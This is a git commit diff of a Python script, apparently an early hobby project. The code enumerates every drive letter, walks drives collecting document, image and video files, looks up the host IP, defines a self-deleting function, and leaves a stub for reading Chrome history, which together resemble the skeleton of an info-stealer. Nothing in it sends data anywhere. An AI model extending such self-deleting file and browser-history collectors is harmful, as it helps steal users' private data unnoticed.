da54317edde1237e9b2b2767096ad4b9f02ea99d
ZingKidd <dionisisarvanitis98@gmail.com>
2022-04-18 22:46:26 +0300

    4th commit!

--- main.py
+++ main.py
@@ -3,16 +3,24 @@ from os import remove
 from sys import argv
 import os
 import webbrowser
+import platform
 
 #import rotatescreen
 # def rotate_screen():
 #     rotate_screen  = rotatescreen.get_primary_display()
 #     rotate_screen.set_landscape_flipped()
 
+VERSION = 0.01
 
 drives = ["A:\\", "B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
 
 different_extensions = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.jpeg', '.mp4']
+
+def print_os():
+    print("OS in my system : ",platform.system())
+
+def return_os():
+    return platform.system()
 
 def self_delete():
     remove(argv[0])
@@ -21,7 +29,7 @@ def find_ip(hostname):
     hostname = socket.gethostname()
     return socket.gethostbyname(hostname)
 
-def locate_files(drive, extension):
+def search_drive_by_extension(drive, extension):
     file_paths = []
     for root, dirs, files in os.walk(drive):
         for file in files:
@@ -44,13 +52,10 @@ def check_alive_drives(drives):
     for drive in drives:
         if os.path.exists(drive):
             print(f"Drive {drive} Does exist")
-            sleep(5)
+            #sleep(5)
             # locate_drives(drive)
         else:
             print(f"Drive {drive} does not exist")
-
-def search_by_file_extension():
-    pass
 
 def chrome_history():
     pass
